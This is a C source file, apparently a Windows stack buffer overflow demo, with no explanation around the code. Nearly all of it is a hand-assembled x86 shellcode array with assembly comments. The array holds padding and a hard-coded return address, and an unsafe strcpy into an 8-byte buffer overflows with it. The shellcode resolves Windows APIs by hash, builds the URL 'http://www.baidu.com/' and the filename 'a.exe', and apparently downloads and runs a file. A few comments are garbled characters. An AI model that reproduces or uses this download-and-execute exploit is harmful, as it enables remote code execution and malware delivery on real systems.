#include <windows.h>
char src[] = 
"\x41\x41\x41\x41"		//野割
"\x41\x41\x41\x41"		//野割
"\x41\x41\x41\x41"		//野割
"\x12\x45\xFA\x7F"		//柳医
//Main:
"\x66\x81\xEC\x04\x01"       	//sub         sp,0x0104
"\x8B\xEC"                		//mov         ebp,esp
"\x33\xC0"                		//xor         eax,eax
"\x66\xB8\x6F\x6E"          		//mov         ax, ax,0x6E6F
"\x50"                   			//push        eax
"\x68\x75\x72\x6C\x6D"       	//push        6D6C7275h
"\x33\xC0"                		//xor         eax,eax
"\x68\x6C\x33\x32\xFF"       	//push        0FF32336Ch
"\x68\x73\x68\x65\x6C"       	//push        6C656873h
"\x33\xC0"                		//xor         eax,eax
"\x88\x44\x24\x07"          		//mov         byte ptr [esp+7],al
"\xB0\x2F"                		//mov         al,2Fh
"\x50"                   			//push        eax
"\x68\x2E\x63\x6F\x6D"       	//push        6D6F632Eh
"\x68\x61\x69\x64\x75"       	//push        75646961h
"\x68\x77\x77\x2E\x62"       	//push        622E7777h
"\x68\x3A\x2F\x2F\x77"       	//push        772F2F3Ah
"\x68\x68\x74\x74\x70"       	//push        70747468h
"\x33\xC0"                		//xor         eax,eax
"\xB0\x65"                		//mov         al,65h
"\x50"                   			//push        eax
"\x68\x61\x2E\x65\x78"       	//push        78652E61h
"\x99"                   			//cdq
"\x64\x8B\x5A\x30"          		//mov      ebx,dword ptr fs:[edx+30h]
"\x8B\x4B\x0C"             		//mov         ecx,dword ptr [ebx+0Ch]
"\x8B\x49\x1C"             		//mov         ecx,dword ptr [ecx+1Ch]
"\x8B\x09"                		//mov         ecx,dword ptr [ecx]
"\x8B\x49\x08"             		//mov         ecx,dword ptr [ecx+8]
"\x51"                   			//push        ecx
"\x68\x32\x74\x91\x0C"       	//push        0C917432h
"\x51"                   			//push        ecx
"\xB3\x01"                		//mov         bl,1
"\xEB\x60"                		//jmp         FindFunc
//MainTemp:
"\x80\xFB\x01"             		//cmp         bl,1
"\x74\x0F"                		//je          MainTemp1
"\x80\xFB\x02"             		//cmp         bl,2
"\x74\x1B"                		//je          MainTemp2
"\x80\xFB\x03"             		//cmp         bl,3
"\x74\x35"                		//je          MainTemp3 
"\x80\xFB\x04"             		//cmp         bl,4
"\x74\x48"                		//je          MainTemp4 
//MainTemp1:
"\x8D\x4D\xF8"             		//lea         ecx,[ebp-8]
"\x50"                   			//push        eax
"\x51"                   			//push        ecx
"\xFF\xD0"                		//call        eax
"\x68\x80\xD6\xAF\x9A"       	//push        9AAFD680h
"\x50"                   			//push        eax
"\xB3\x02"                		//mov         bl,2
"\xEB\x3B"                		//jmp         FindFunc
//MainTemp2:
"\x99"                   			//cdq
"\x52"                   			//push        edx
"\x52"                   			//push        edx
"\x8D\x4D\xD0"             		//lea         ecx,[ebp-30h]
"\x51"                   			//push        ecx
"\x8D\x4D\xD8"             		//lea         ecx,[ebp-28h]
"\x51"                   			//push        ecx
"\x52"                   			//push        edx
"\xFF\xD0"                		//call        eax
"\x8D\x4D\xF0"             		//lea         ecx,[ebp-10h]
"\x51"                   			//push        ecx
"\xFF\x55\xC8"             		//call        dword ptr [ebp-38h]
"\x68\x58\xCB\x3B\x21"       	//push        213BCB58h
"\x50"                   			//push        eax
"\xB3\x03"                		//mov         bl,3
"\xEB\x1C"                		//jmp         FindFunc
//MainTemp3:
"\x99"                   			//cdq
"\x52"                   			//push        edx
"\x52"                   			//push        edx
"\x52"                   			//push        edx
"\x8D\x4D\xD0"             		//lea         ecx,[ebp-30h]
"\x51"                   			//push        ecx
"\x52"                   			//push        edx
"\x52"                   			//push        edx
"\xFF\xD0"                		//call        eax
"\x68\x63\x89\xD1\x4F"       	//push        4FD18963h
"\xFF\x75\xCC"             		//push        dword ptr [ebp-34h]
"\xB3\x04"                		//mov         bl,4
"\xEB\x04"                		//jmp         FindFunc
//MainTemp4:
"\x99"                   			//cdq
"\x52"                   			//push        edx
"\xFF\xD0"                		//call        eax
//FindFunc:
"\x55"                   			//push        ebp
"\x8B\xEC"                		//mov         ebp,esp
"\x53"                   			//push        ebx
"\x8B\x5D\x04"             		//mov         ebx,dword ptr [ebp+4]
"\x8B\x43\x3C"             		//mov         eax,dword ptr [ebx+3Ch]
"\x8B\x4C\x18\x78"          		//mov      ecx,dword ptr [eax+ebx+78h]
"\x03\xCB"                		//add         ecx,ebx
"\x8B\x51\x20"             		//mov         edx,dword ptr [ecx+20h]
"\x03\xD3"                		//add         edx,ebx
"\x33\xFF"                		//xor         edi,edi
//FindFuncLoop:
"\x47"                   			//inc         edi
"\x8B\x34\xBA"             		//mov      esi,dword ptr [edx+edi*4]
"\x03\xF3"                		//add         esi,ebx
"\x56"                   			//push        esi
"\xEB\x27"                		//jmp         GetHash
//FindFuncTemp:
"\x3B\x45\x08"             		//cmp         eax,dword ptr [ebp+8]
"\x75\xF2"                		//jne         FindFuncLoop
"\x8B\x41\x24"             		//mov         eax,dword ptr [ecx+24h]
"\x03\xC3"                		//add         eax,ebx
"\x66\x8B\x3C\x78"          		//mov         di,word ptr [eax+edi*2]
"\x8B\x41\x1C"             		//mov         eax,dword ptr [ecx+1Ch]
"\x03\xC3"                		//add         eax,ebx
"\x8B\x04\xB8"             		//mov      eax,dword ptr [eax+edi*4]
"\x03\xC3"                		//add         eax,ebx
"\xEB\x01"                		//jmp         FindFuncRetrun
"\x90"                   			//nop
//FindFuncRetrun:
"\x5B"                   			//pop         ebx
"\x8B\xE5"                		//mov         esp,ebp
"\x5D"                   			//pop         ebp
"\x83\xC4\x08"             		//add         esp,8
"\xE9\x59\xFF\xFF\xFF"       	//jmp         MainTemp
//GetHash:
"\x55"                   			//push        ebp
"\x8B\xEC"                		//mov         ebp,esp
"\x53"                   			//push        ebx
"\x51"                   			//push        ecx
"\x52"                   			//push        edx
"\x33\xC0"                		//xor         eax,eax
"\x33\xDB"                		//xor         ebx,ebx
"\x99"                   			//cdq
"\x8B\x4D\x04"             		//mov         ecx,dword ptr [ebp+4]
//HashLoop:
"\x3A\x11"                		//cmp         dl,byte ptr [ecx]
"\x74\x0C"                		//je          GetHashReturn (00401233)
"\xC1\xC8\x07"             		//ror         eax,7
"\x0F\xBE\x19"             		//movsx       ebx,byte ptr [ecx]
"\x03\xC3"                		//add         eax,ebx
"\x41"                   			//inc         ecx
"\xEB\xF1"                		//jmp         HashLoop (00401223)
"\x90"                   			//nop
//GetHashReturn:
"\x5A"                   			//pop         edx
"\x59"                   			//pop         ecx
"\x5B"                   			//pop         ebx
"\x8B\xE5"                		//mov         esp,ebp
"\x5D"                   			//pop         ebp
"\x83\xC4\x04"             		//add         esp,4
"\xEB\xB0";                		//jmp         FindFuncTemp (004011ee)

int MyFunc()
{
	CHAR dest[8] = {0};
	strcpy(dest,src);
}
int main()
{
	char buff[256] = {0};
	MyFunc();
	return 0;
}
